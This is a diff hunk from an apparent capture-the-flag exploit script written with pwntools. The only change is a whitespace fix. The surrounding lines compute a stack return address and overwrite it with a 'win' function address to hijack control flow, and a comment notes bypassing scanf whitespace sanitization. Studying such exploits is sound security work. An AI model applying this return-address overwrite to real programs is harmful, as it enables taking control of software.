@@ -97,7 +97,7 @@ def one_round(io: pwn.process):
 
     addrof_return = addrof_free + rbp_free + 0x8
     pwn.success(f"Address of return address on stack: {hex(addrof_return)}")
-    
+
     # hard side need to bypass white space sanitization on scanf
     write_qword(addrof_return, win_addr)
     io.sendline(b"quit")
